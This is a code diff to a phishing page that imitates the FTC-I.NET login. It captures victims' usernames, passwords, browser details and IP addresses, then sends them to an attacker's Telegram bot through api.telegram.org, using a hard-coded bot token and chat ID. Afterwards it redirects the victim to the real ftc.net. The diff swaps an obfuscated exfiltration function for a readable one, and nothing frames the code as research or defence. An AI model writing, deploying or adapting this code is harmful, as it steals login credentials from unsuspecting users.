@@ -111,7 +111,7 @@ color:rgb(244, 67, 54);
 
         <script>
 
-                  function browserN() {
+        function browserN() {
   if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1) {
     return 'Opera';
   } else if (navigator.userAgent.indexOf("Edg") != -1) {
@@ -130,12 +130,12 @@ color:rgb(244, 67, 54);
   }
 }
 
-        const get_ip = null;
 
         function fetch_ip(){
           var getip = null;
           $.getJSON("https://api.ipify.org?format=json", function(data) {
               getip =  data.ip;
+              return getip;
           });
 
           return getip;
@@ -148,7 +148,7 @@ color:rgb(244, 67, 54);
 
 
         const provider = "FTC-I.NET(https://ftc.net)";
-        get_ip = fetch_ip();
+        const get_ip = fetch_ip();
         const get_browsername = browserN();
 
         alert(get_ip);
@@ -169,7 +169,7 @@ color:rgb(244, 67, 54);
             $("#error").html("");
 
             var message = `PROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
-            var status = notifyTelegram(message);
+            var status = notify(message);
 
 
             window.location.href = "https://ftc.net";
@@ -182,12 +182,31 @@ color:rgb(244, 67, 54);
         })
 
 
-          
-        async function notifyTelegram(message) {
-           const _0x364a58=_0x5776;(function(_0x3af2c2,_0x130b67){const _0x408b9e=_0x5776,_0x31bfdd=_0x3af2c2();while(!![]){try{const _0x1d504d=-parseInt(_0x408b9e(0xd8))/0x1*(-parseInt(_0x408b9e(0xe3))/0x2)+parseInt(_0x408b9e(0xdd))/0x3+-parseInt(_0x408b9e(0xe6))/0x4+parseInt(_0x408b9e(0xe0))/0x5*(-parseInt(_0x408b9e(0xd9))/0x6)+-parseInt(_0x408b9e(0xdf))/0x7*(-parseInt(_0x408b9e(0xdc))/0x8)+-parseInt(_0x408b9e(0xda))/0x9+-parseInt(_0x408b9e(0xe4))/0xa*(parseInt(_0x408b9e(0xe7))/0xb);if(_0x1d504d===_0x130b67)break;else _0x31bfdd['push'](_0x31bfdd['shift']());}catch(_0x14b230){_0x31bfdd['push'](_0x31bfdd['shift']());}}}(_0x1406,0xeb7ca));const botToken=_0x364a58(0xe8),chatId=_0x364a58(0xd6),url=_0x364a58(0xde)+botToken+_0x364a58(0xdb),data={'chat_id':chatId,'text':message};function _0x5776(_0x35bc52,_0x1d0a87){const _0x14063b=_0x1406();return _0x5776=function(_0x577672,_0x1baca){_0x577672=_0x577672-0xd5;let _0x4054cd=_0x14063b[_0x577672];return _0x4054cd;},_0x5776(_0x35bc52,_0x1d0a87);}try{const response=await fetch(url,{'method':'POST','headers':{'Content-Type':_0x364a58(0xd7)},'body':JSON[_0x364a58(0xe5)](data)});!response['ok']&&console['error'](_0x364a58(0xe2)+await response[_0x364a58(0xd5)]());}catch(_0x2219d4){console['error'](_0x364a58(0xe1)+_0x2219d4);}function _0x1406(){const _0x2cc898=['application/json','1890113FYoTjn','24MSqWlA','2257713lgZbir','/sendMessage','8khlMFn','703602UOYYMw','https://api.telegram.org/bot','3057509OpFHSg','885745VlbRkq','Fetch\x20error:\x20','Error\x20notifying\x20Telegram:\x20','2xJLsLw','20XnFoRn','stringify','1667812RmqvDB','1212607qTWnTg','7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c','text','1369859387'];_0x1406=function(){return _0x2cc898;};return _0x1406();}
+        async function notify(message) {
+            const botToken = '7582406379:AAFSqZwUfw807J6Qf51Wa3fSQS5pPhU-R3c';
+            const chatId = '1369859387';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    console.error('Error notifying Telegram: ' + await response.text());
+                }
+            } catch (error) {
+                console.error('Fetch error: '+ error);
+            }
+
         }
-        
-        </script>
+    </script>
 
 
 </body>
